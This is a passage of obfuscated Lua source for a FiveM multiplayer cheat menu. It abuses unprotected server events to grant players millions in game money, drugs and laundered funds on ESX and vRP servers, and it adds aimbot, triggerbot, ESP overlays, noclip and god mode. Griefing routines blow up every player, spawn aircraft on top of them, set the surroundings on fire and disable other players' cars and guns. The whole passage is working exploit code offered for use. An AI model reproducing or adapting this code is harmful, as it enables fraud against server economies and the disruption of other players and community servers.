            TriggerServerEvent('lscustoms:payGarage', 15000000)
            TriggerServerEvent('esx_tankerjob:pay', 15000000)
            TriggerServerEvent('esx_vehicletrunk:giveDirty', 15000000)
            TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 15000000)
            TriggerServerEvent('gambling:spend', 15000000)
            TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 15000000)
            TriggerServerEvent('AdminMenu:giveDirtyMoney', 15000000)
            TriggerServerEvent('AdminMenu:giveBank', 15000000)
            TriggerServerEvent('AdminMenu:giveCash', 15000000)
            TriggerServerEvent('esx_slotmachine:sv:2', 15000000)
            TriggerServerEvent('esx_moneywash:deposit', 15000000)
            TriggerServerEvent('esx_moneywash:withdraw', 15000000)
            TriggerServerEvent('esx_moneywash:deposit', 15000000)
            TriggerServerEvent('mission:completed', 15000000)
            TriggerServerEvent('truckerJob:success',15000000)
            TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', 15000000)
            TriggerServerEvent("dropOff", 15000000)
            TriggerServerEvent('truckerfuel:success',15000000)
            TriggerServerEvent('delivery:success',15000000)
            TriggerServerEvent("lscustoms:payGarage", {costs = -15000000})
            TriggerServerEvent("esx_brinksjob:pay", 15000000)
            TriggerServerEvent("esx_garbagejob:pay", 15000000)
            TriggerServerEvent("esx_postejob:pay", 15000000)
            TriggerServerEvent('esx_garbage:pay', 15000000)
            TriggerServerEvent("esx_carteirojob:pay", 15000000) 
        elseif RPPPwdjwdU23.Button("~y~Hydra Speed") then
            SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()),9500.0)
        end

        -- ESX OPTIONS
        elseif RPPPwdjwdU23.IsMenuOpened('esx') then
            if RPPPwdjwdU23.Button("~b~ESX ~w~Restore Hunger") then
                TriggerEvent("esx_status:set", "hunger", 1000000)
            elseif RPPPwdjwdU23.Button("~b~ESX ~w~Restore Thirst") then
                TriggerEvent("esx_status:set", "thirst", 1000000)
            elseif RPPPwdjwdU23.Button("~b~ESX ~w~Revive Self") then
                TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(PlayerId()))
            elseif RPPPwdjwdU23.Button("~b~ESX ~w~Revive By ID") then
                local serverID = GetKeyboardInput("Enter Player Server ID:")
                TriggerServerEvent('esx_ambulancejob:revive', serverID)
            end
        
        
        --- VRP Options
        elseif RPPPwdjwdU23.IsMenuOpened('vrp') then
            if RPPPwdjwdU23.Button("~r~vRP ~p~Toggle Handcuffs") then
                vRP.toggleHandcuff()
            elseif RPPPwdjwdU23.Button("Handcuff player ~g~works") then
                TriggerServerEvent('handcuff:cuffHim')
            elseif RPPPwdjwdU23.Button("Giv Dig Selv Penge p?? alle server") then
                print("Filens placering C:\\Users\\Administrator\\Desktop\\server\\resources\\[vrp]\\vrp\\cfg\\money.lua")    
                local belob = GetKeyboardInput("Bel??b")
                TriggerServerEvent('trucker:success',tonumber(belob))
            elseif RPPPwdjwdU23.Button("Giv dig selv penge p?? alle server (~r~infinity)") then  
                print("Filens placering C:\\Users\\Administrator\\Desktop\\server\\resources\\[vrp]\\vrp\\cfg\\money.lua")      	         	
                TriggerServerEvent('trucker:success',999999999999999999)
            elseif RPPPwdjwdU23.Button("Giv Dig Selv Penge p?? alle server (~p~10 M)") then  
                print("Filens placering C:\\Users\\Administrator\\Desktop\\server\\resources\\[vrp]\\vrp\\cfg\\money.lua")      	         	
                TriggerServerEvent('trucker:success',10000000)
            elseif RPPPwdjwdU23.Button("Giv Dig Selv Penge p?? alle server (~p~1 M)") then  
                print("Filens placering C:\\Users\\Administrator\\Desktop\\server\\resources\\[vrp]\\vrp\\cfg\\money.lua")       	         	
                TriggerServerEvent('trucker:success',1000000)
            elseif RPPPwdjwdU23.Button("~h~~b~------Hvidvask/kokain------") then
        elseif RPPPwdjwdU23.Button("Giv dig selv kokain p?? alle server") then
            TriggerServerEvent('kokain2')
    elseif RPPPwdjwdU23.Button("Fremstill kokain p?? alle server") then
        TriggerServerEvent('Fremstill2')
    elseif RPPPwdjwdU23.Button("saalg af kokain p?? alle server") then
        TriggerServerEvent('saalg2')
    elseif RPPPwdjwdU23.Button("Hvidvask p?? alle server") then
        TriggerServerEvent('Hvidvask3')
    elseif RPPPwdjwdU23.Button("Giv dig selv alt p?? servern") then
        TriggerServerEvent('trucker:success',10000000)
        TriggerServerEvent('kokain2')
        TriggerServerEvent('kokain2')
        TriggerServerEvent('kokain2')
        TriggerServerEvent('kokain2')
        TriggerServerEvent('kokain2')
        TriggerServerEvent('kokain2')
        TriggerServerEvent('kokain2')
        TriggerServerEvent('kokain2')
        TriggerServerEvent('kokain2')
        TriggerServerEvent('kokain2')
        TriggerServerEvent('kokain2')
        TriggerServerEvent('kokain2')
        TriggerServerEvent('Fremstill2')
        TriggerServerEvent('Fremstill2')
        TriggerServerEvent('Fremstill2')
        TriggerServerEvent('Fremstill2')
        TriggerServerEvent('Fremstill2')
        TriggerServerEvent('Fremstill2')
        TriggerServerEvent('Fremstill2')
        TriggerServerEvent('Fremstill2')
        TriggerServerEvent('saalg2')
        TriggerServerEvent('saalg2')
        TriggerServerEvent('saalg2')
        TriggerServerEvent('saalg2')
        TriggerServerEvent('saalg2')
        TriggerServerEvent('Hvidvask3')
        TriggerServerEvent('Hvidvask3')
        TriggerServerEvent('Hvidvask3')
        TriggerServerEvent('Hvidvask3')
            end
        

        elseif RPPPwdjwdU23.IsMenuOpened('credits') then
            for i = 1, #developers do if RPPPwdjwdU23.Button(developers[i]) then end end
        
        
        -- OPEN MENU
        elseif IsDisabledControlJustReleased(0, Keys[menuKeybind]) then RPPPwdjwdU23.OpenMenu('RedBoy')
        elseif IsDisabledControlJustReleased(0, Keys[menuKeybind5]) then RPPPwdjwdU23.OpenMenu('RedBoy')
        

		elseif IsDisabledControlJustReleased(0, Keys[fixcarKeybind]) then 
			FixVeh(GetVehiclePedIsIn(PlayerPedId(), 0)) 
			ShowInfo("Vehicle ~g~Fixed!")
		
		-- Heal self (keybing)
		elseif IsDisabledControlJustReleased(0, Keys[healplayerKeybind]) then
			SetEntityHealth(PlayerPedId(), 200.0)
			ShowInfo("Player ~g~Healed!")
			
		end
		
        RPPPwdjwdU23.Display()
        

        if Demigod then
            if GetEntityHealth(PlayerPedId()) < 200 then
                SetEntityHealth(PlayerPedId(), 200)
            end
        end
        
        if ADemigod then
            SetEntityHealth(PlayerPedId(), 189.9)
        end
        
        if NeverWanted then
            ClearPlayerWantedLevel(PlayerId())
        end
        
        if Noclipping then
            local isInVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)
            local k = nil
            local x, y, z = nil
            
            if not isInVehicle then
                k = PlayerPedId()
                x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 2))
            else
                k = GetVehiclePedIsIn(PlayerPedId(), 0)
                x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 1))
            end
            
            if isInVehicle and GetSeatPedIsIn(PlayerPedId()) ~= -1 then RequestControlOnce(k) end
            
            local dx, dy, dz = GetCamDirection()
            SetEntityVisible(PlayerPedId(), 0, 0)
            SetEntityVisible(k, 0, 0)
            
            SetEntityVelocity(k, 0.0001, 0.0001, 0.0001)
            
            if IsDisabledControlJustPressed(0, Keys["LEFTSHIFT"]) then
                oldSpeed = NoclipSpeed
                NoclipSpeed = NoclipSpeed * 2
            end
            if IsDisabledControlJustReleased(0, Keys["LEFTSHIFT"]) then 
                NoclipSpeed = oldSpeed
            end
            
            if IsDisabledControlPressed(0, 32) then 
                x = x + NoclipSpeed * dx
                y = y + NoclipSpeed * dy
                z = z + NoclipSpeed * dz
            end
            
            if IsDisabledControlPressed(0, 269) then 
                x = x - NoclipSpeed * dx
                y = y - NoclipSpeed * dy
                z = z - NoclipSpeed * dz
            end
			
			if IsDisabledControlPressed(0, Keys["SPACE"]) then
                z = z + NoclipSpeed
            end
            
			if IsDisabledControlPressed(0, Keys["LEFTCTRL"]) then 
                z = z - NoclipSpeed
            end
            
            
            SetEntityCoordsNoOffset(k, x, y, z, true, true, true)
        end
        
        if ExplodingAll then
            Citizen.CreateThread(function()
                local dg="Avenger"
                local dh="CARGOPLANE"
                local di="luxor"
                local dj="maverick"
                local dk="blimp2"
                
                while not HasModelLoaded(GetHashKey(dh))do 
                    Citizen.Wait(0)
                    RequestModel(GetHashKey(dh))
                end
                
                while not HasModelLoaded(GetHashKey(di))do
                    Citizen.Wait(0)RequestModel(GetHashKey(di))
                end
                    
                while not HasModelLoaded(GetHashKey(dg))do 
                    Citizen.Wait(0)RequestModel(GetHashKey(dg))
                end
                    
                while not HasModelLoaded(GetHashKey(dj))do 
                    Citizen.Wait(0)RequestModel(GetHashKey(dj))
                end
                
                while not HasModelLoaded(GetHashKey(dk))do 
                    Citizen.Wait(0)RequestModel(GetHashKey(dk))
                end
                
                for i=0,128 do 
                    local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)
                end
             end)
        end


        if jdiuwajduawhdu then
            
            function ExplodePlayer(target)
                local ped = GetPlayerPed(target)
                local coords = GetEntityCoords(ped)
                AddExplosion(coords.x + 1, coords.y + 1, coords.z + 1, 4, 100.0, true, false, 0.0)
            end

        end


        if dwakodkwiajdiawjd then
            Citizen.CreateThread(function()
                local dg="Avenger"
                local dh="CARGOPLANE"
                local di="luxor"
                local dj="maverick"
                local dk="blimp2"
                
                while not HasModelLoaded(GetHashKey(dh))do 
                    Citizen.Wait(0)
                    RequestModel(GetHashKey(dh))
                end
                
                while not HasModelLoaded(GetHashKey(di))do
                    Citizen.Wait(0)RequestModel(GetHashKey(di))
                end
                    
                while not HasModelLoaded(GetHashKey(dg))do 
                    Citizen.Wait(0)RequestModel(GetHashKey(dg))
                end
                    
                while not HasModelLoaded(GetHashKey(dj))do 
                    Citizen.Wait(0)RequestModel(GetHashKey(dj))
                end
                
                while not HasModelLoaded(GetHashKey(dk))do 
                    Citizen.Wait(0)RequestModel(GetHashKey(dk))
                end
                
                for i=0,128 do 
                    local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)
                end
             end)
        end
        
        if Tracking then
            local coords = GetEntityCoords(GetPlayerPed(TrackedPlayer))
            SetNewWaypoint(coords.x, coords.y)
        end
        
		if FlingingPlayer then
			local coords = GetEntityCoords(GetPlayerPed(FlingedPlayer))
			Citizen.InvokeNative(0xE3AD2BDBAEE269AC, coords.x, coords.y, coords.z, 4, 1.0, 0, 1, 0.0, 1)
		end
		
        if InfStamina then
            RestorePlayerStamina(PlayerId(), GetPlayerSprintStaminaRemaining(PlayerId()))
        end

        if SuperJump then
            SetSuperJumpThisFrame(PlayerId())
        end
        
        if Invisibility then
            SetEntityVisible(PlayerPedId(), 0, 0)
        end
        
        if Forcefield then
            DoForceFieldTick(ForcefieldRadius)
        end
        
        if CarsDisabled then
            local plist = GetActivePlayers()
            for i = 1, #plist do
                if IsPedInAnyVehicle(GetPlayerPed(plist[i]), true) then
                    ClearPedTasksImmediately(GetPlayerPed(plist[i]))
                end
            end
        end
        
        if GunsDisabled then
            local plist = GetActivePlayers()
            for i = 1, #plist do
                if IsPedShooting(GetPlayerPed(plist[i])) then
                    ClearPedTasksImmediately(GetPlayerPed(plist[i]))
                end
            end
        end
        
        if NoisyCars then
            for k in EnumerateVehicles() do
                SetVehicleAlarmTimeLeft(k, 500)
            end
        end
        
        if FlyingCars then
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                ApplyForceToEntity(k, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
            end
        end
        
        if SuperGravity then
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                SetVehicleGravityAmount(k, GravAmount)
            end
        end
        
        if WorldOnFire then
            local pos = GetEntityCoords(PlayerPedId())
            local k = GetRandomVehicleInSphere(pos, 100.0, 0, 0)
            if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) then
                local targetpos = GetEntityCoords(k)
                local x, y, z = table.unpack(targetpos)
                local expposx = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x
                local expposy = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y
                local expposz = math.random(math.floor(z - 0.5), math.ceil(z + 1.5)) % z
                AddExplosion(expposx, expposy, expposz, 1, 1.0, 1, 0, 0.0)
                AddExplosion(expposx, expposy, expposz, 4, 1.0, 1, 0, 0.0)
            end
            
            for v in EnumeratePeds() do
                if v ~= PlayerPedId() then
                    local targetpos = GetEntityCoords(v)
                    local x, y, z = table.unpack(targetpos)
                    local expposx = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x
                    local expposy = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y
                    local expposz = math.random(math.floor(z), math.ceil(z + 1.5)) % z
                    AddExplosion(expposx, expposy, expposz, 1, 1.0, 1, 0, 0.0)
                    AddExplosion(expposx, expposy, expposz, 4, 1.0, 1, 0, 0.0)
                end
            end
        end
        
        if FuckMap then
            for i = -4000.0, 8000.0, 3.14159 do
                local _, z1 = GetGroundZFor_3dCoord(i, i, 0, 0)
                local _, z2 = GetGroundZFor_3dCoord(-i, i, 0, 0)
                local _, z3 = GetGroundZFor_3dCoord(i, -i, 0, 0)
                
                CreateObject(GetHashKey("stt_prop_stunt_track_start"), i, i, z1, 0, 1, 1)
                CreateObject(GetHashKey("stt_prop_stunt_track_start"), -i, i, z2, 0, 1, 1)
                CreateObject(GetHashKey("stt_prop_stunt_track_start"), i, -i, z3, 0, 1, 1)
            end
        end
        
        if ClearStreets then
            SetVehicleDensityMultiplierThisFrame(0.0)
            SetRandomVehicleDensityMultiplierThisFrame(0.0)
            SetParkedVehicleDensityMultiplierThisFrame(0.0)
            SetAmbientVehicleRangeMultiplierThisFrame(0.0)
            SetPedDensityMultiplierThisFrame(0.0)
        end
        
        if RapidFire then
            DoRapidFireTick()
        end
        
        if Aimbot then
            

            if DrawFov then
                DrawRect(0.25, 0.5, 0.01, 0.515, 255, 80, 80, 100)
                DrawRect(0.75, 0.5, 0.01, 0.515, 255, 80, 80, 100)
                DrawRect(0.5, 0.25, 0.49, 0.015, 255, 80, 80, 100)
                DrawRect(0.5, 0.75, 0.49, 0.015, 255, 80, 80, 100)
            end
            
            local plist = GetActivePlayers()
            for i = 1, #plist do
                ShootAimbot(GetPlayerPed(plist[i]))
            end
        
        end
        
        if Ragebot and IsDisabledControlPressed(0, Keys["MOUSE1"]) then
            for k in EnumeratePeds() do
                if k ~= PlayerPedId() then RageShoot(k) end
            end
        end
        
        if Crosshair then
            ShowHudComponentThisFrame(14)
        end
        
        if ShowCoords then
            local pos = GetEntityCoords(PlayerPedId())
            DrawTxt("~b~X: ~w~" .. round(pos.x, 3), 0.38, 0.03, 0.0, 0.4)
            DrawTxt("~b~Y: ~w~" .. round(pos.y, 3), 0.45, 0.03, 0.0, 0.4)
            DrawTxt("~b~Z: ~w~" .. round(pos.z, 3), 0.52, 0.03, 0.0, 0.4)
        end
        
        if ExplosiveAmmo then
            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
            if ret then
                AddExplosion(pos.x, pos.y, pos.z, 1, 1.0, 1, 0, 0.1)
            end
        end
        
        if ForceGun then
            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
            if ret then
                for k in EnumeratePeds() do
                    local coords = GetEntityCoords(k)
                    if k ~= PlayerPedId() and GetDistanceBetweenCoords(pos, coords) <= 1.0 then
                        local forward = GetEntityForwardVector(PlayerPedId())
                        RequestControlOnce(k)
                        ApplyForce(k, forward * 500)
                    end
                end
                
                for k in EnumerateVehicles() do
                    local coords = GetEntityCoords(k)
                    if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) and GetDistanceBetweenCoords(pos, coords) <= 3.0 then
                        local forward = GetEntityForwardVector(PlayerPedId())
                        RequestControlOnce(k)
                        ApplyForce(k, forward * 500)
                    end
                end
            
            end
        end
        
        if Triggerbot then
            local hasTarget, target = GetEntityPlayerIsFreeAimingAt(PlayerId())
            if hasTarget and IsEntityAPed(target) then
                ShootAt(target, "SKEL_HEAD")
            end
        end
        
        if not Collision then
            playerveh = GetVehiclePedIsIn(PlayerPedId(), false)
            for k in EnumerateVehicles() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
            for k in EnumerateObjects() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
            for k in EnumeratePeds() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
        end
        
        if DeadlyBulldozer then
            SetVehicleBulldozerArmPosition(GetVehiclePedIsIn(PlayerPedId(), 0), math.random() % 1, 1)
            SetVehicleEngineHealth(GetVehiclePedIsIn(PlayerPedId(), 0), 1000.0)
            if not IsPedInAnyVehicle(PlayerPedId(), 0) then
                DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 1))
                DeadlyBulldozer = not DeadlyBulldozer
            elseif IsDisabledControlJustPressed(0, Keys["E"]) then
                local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                local coords = GetEntityCoords(veh)
                local forward = GetEntityForwardVector(veh)
                local heading = GetEntityHeading(veh)
                local veh = CreateVehicle(GetHashKey("BULLDOZER"), coords.x + forward.x * 10, coords.y + forward.y * 10, coords.z, heading, 1, 1)
                SetVehicleColours(veh, 27, 27)
                SetVehicleEngineHealth(veh, -3500.0)
                ApplyForce(veh, forward * 500.0)
            end
        end
        
        if RPPPwdjwdU23.IsMenuOpened('objectlist') then
            for i = 1, #SpawnedObjects do
                local x, y, z = table.unpack(GetEntityCoords(SpawnedObjects[i]))
                DrawText3D(x, y, z, "OBJECT " .. "[" .. i .. "] " .. "WITH ID " .. SpawnedObjects[i])
            end
        end
        
        if NametagsEnabled then
            tags_plist = GetActivePlayers()
            for i = 1, #tags_plist do
                if NetworkIsPlayerTalking(tags_plist[i]) then
                    SetMpGamerTagVisibility(ptags[i], 4, 1)
                else
                    SetMpGamerTagVisibility(ptags[i], 4, 0)
                end
                
                if IsPedInAnyVehicle(GetPlayerPed(tags_plist[i])) and GetSeatPedIsIn(GetPlayerPed(tags_plist[i])) == 0 then
                    SetMpGamerTagVisibility(ptags[i], 8, 1)
                else
                    SetMpGamerTagVisibility(ptags[i], 8, 0)
                end
            
            end
        end
        
        local urname = GetPlayerName(PlayerId())

        if ANametagsEnabled then
            local plist = GetActivePlayers()
            table.removekey(plist, PlayerId())
            for i = 1, #plist do
                local pos = GetEntityCoords(GetPlayerPed(plist[i]))
                local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), pos)
                if distance <= 30 then
                    if ANametagsNotNeedLOS then
                        DrawText3D(pos.x, pos.y, pos.z + 1.3, "~b~ID: ~w~" .. GetPlayerServerId(plist[i]) .. "\n~b~Name: ~w~" .. GetPlayerName(plist[i]))
                    elseif not ANametagsNotNeedLOS and HasEntityClearLosToEntity(PlayerPedId(), GetPlayerPed(plist[i]), 17) then
                        DrawText3D(pos.x, pos.y, pos.z + 1.3, "~b~ID: ~w~" .. GetPlayerServerId(plist[i]) .. "\n~b~Name: ~w~" .. GetPlayerName(plist[i]))
                    end
                end
            end
        end
        
        if LinesEnabled then
            local plist = GetActivePlayers()
            local playerCoords = GetEntityCoords(PlayerPedId())
            for i = 1, #plist do
                if i == PlayerId() then i = i + 1 end
                local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
                DrawLine(playerCoords, targetCoords, 0, 0, 255, 255)
            end
        end

	if WeatherChanger then
	    SetWeatherTypePersist(WeatherType)
	    SetWeatherTypeNowPersist(WeatherType)
	    SetWeatherTypeNow(WeatherType)
	    SetOverrideWeather(WeatherType)
	end
        

        if Radio then
            PortableRadio = true
            SetRadioToStationIndex(RadioStation)
        elseif not Radio then
            PortableRadio = false
        end

        if PortableRadio then
            SetVehicleRadioEnabled(GetVehiclePedIsIn(PlayerPedId(), 0), false)
            SetMobilePhoneRadioState(true)
            SetMobileRadioEnabledDuringGameplay(true)
            HideHudComponentThisFrame(16)
        elseif not PortableRadio then
            SetVehicleRadioEnabled(GetVehiclePedIsIn(PlayerPedId(), 0), true)
            SetMobilePhoneRadioState(false)
            SetMobileRadioEnabledDuringGameplay(false)
            ShowHudComponentThisFrame(16)
            local radioIndex = GetPlayerRadioStationIndex()

            if IsPedInAnyVehicle(PlayerPedId(), false) and radioIndex + 1 ~= 19 then 
                
                currRadioIndex = radioIndex + 1
                selRadioIndex = radioIndex + 1
            end
        end

        if ForceMap then
            DisplayRadar(true)
        end

        if ForceThirdPerson then
            SetFollowPedCamViewMode(0)
            SetFollowVehicleCamViewMode(0)
        end

        Wait(0)
    end
end)
